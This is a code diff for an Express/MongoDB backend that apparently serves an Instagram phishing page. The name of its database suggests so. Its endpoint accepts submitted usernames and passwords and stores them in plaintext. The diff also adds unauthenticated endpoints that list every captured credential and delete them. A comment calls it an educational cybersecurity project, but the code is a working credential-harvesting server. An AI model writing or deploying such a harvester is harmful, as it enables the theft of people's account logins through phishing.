@@ -1,23 +1,24 @@
 import express from 'express';
 import cors from 'cors';
-import XLSX from 'xlsx';
-import fs from 'fs';
-import path from 'path';
-import { fileURLToPath } from 'url';
+import mongoose from 'mongoose';
+import dotenv from 'dotenv';
+import Credential from './models/Credential.js';
 
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
+dotenv.config();
 
 const app = express();
-const PORT = 3001;
+const PORT = process.env.PORT || 3001;
 
 app.use(cors());
 app.use(express.json());
 
-const excelFilePath = path.join(__dirname, 'credenciales.xlsx');
+// Conectar a MongoDB
+mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/instagram-phishing-study')
+  .then(() => console.log('✅ Conectado a MongoDB'))
+  .catch(err => console.error('❌ Error conectando a MongoDB:', err));
 
 // Endpoint para guardar credenciales
-app.post('/api/save-credentials', (req, res) => {
+app.post('/api/save-credentials', async (req, res) => {
   try {
     const { username, password } = req.body;
 
@@ -25,51 +26,51 @@ app.post('/api/save-credentials', (req, res) => {
       return res.status(400).json({ error: 'Faltan credenciales' });
     }
 
-    let workbook;
-    let worksheet;
-    let data = [];
-
-    // Verificar si el archivo Excel existe
-    if (fs.existsSync(excelFilePath)) {
-      // Leer el archivo existente
-      workbook = XLSX.readFile(excelFilePath);
-      worksheet = workbook.Sheets[workbook.SheetNames[0]];
-      data = XLSX.utils.sheet_to_json(worksheet);
-    }
-
-    // Agregar nueva entrada con timestamp
-    data.push({
-      'Fecha y Hora': new Date().toLocaleString('es-ES'),
-      'Usuario/Email': username,
-      'Contraseña': password
+    // Crear nueva credencial en MongoDB
+    const newCredential = new Credential({
+      username,
+      password,
+      timestamp: new Date()
     });
 
-    // Crear nuevo workbook
-    const newWorkbook = XLSX.utils.book_new();
-    const newWorksheet = XLSX.utils.json_to_sheet(data);
+    await newCredential.save();
 
-    // Ajustar el ancho de las columnas
-    newWorksheet['!cols'] = [
-      { wch: 20 },
-      { wch: 30 },
-      { wch: 20 }
-    ];
-
-    XLSX.utils.book_append_sheet(newWorkbook, newWorksheet, 'Credenciales');
-
-    // Guardar el archivo
-    XLSX.writeFile(newWorkbook, excelFilePath);
-
-    console.log('Credenciales guardadas:', { username, timestamp: new Date().toLocaleString('es-ES') });
+    console.log('✅ Credenciales guardadas:', {
+      username,
+      timestamp: newCredential.timestamp.toLocaleString('es-ES')
+    });
 
     res.json({ success: true, message: 'Credenciales guardadas' });
   } catch (error) {
-    console.error('Error al guardar credenciales:', error);
+    console.error('❌ Error al guardar credenciales:', error);
     res.status(500).json({ error: 'Error al guardar credenciales' });
   }
 });
 
+// Endpoint para ver todas las credenciales (solo para desarrollo/estudio)
+app.get('/api/credentials', async (req, res) => {
+  try {
+    const credentials = await Credential.find().sort({ timestamp: -1 });
+    res.json(credentials);
+  } catch (error) {
+    console.error('Error al obtener credenciales:', error);
+    res.status(500).json({ error: 'Error al obtener credenciales' });
+  }
+});
+
+// Endpoint para limpiar todas las credenciales (útil para testing)
+app.delete('/api/credentials', async (req, res) => {
+  try {
+    await Credential.deleteMany({});
+    console.log('🗑️ Todas las credenciales han sido eliminadas');
+    res.json({ success: true, message: 'Credenciales eliminadas' });
+  } catch (error) {
+    console.error('Error al eliminar credenciales:', error);
+    res.status(500).json({ error: 'Error al eliminar credenciales' });
+  }
+});
+
 app.listen(PORT, () => {
-  console.log(`Servidor corriendo en http://localhost:${PORT}`);
-  console.log(`Las credenciales se guardarán en: ${excelFilePath}`);
+  console.log(`🚀 Servidor corriendo en http://localhost:${PORT}`);
+  console.log('📚 Proyecto educativo - Solo para estudio de ciberseguridad');
 });
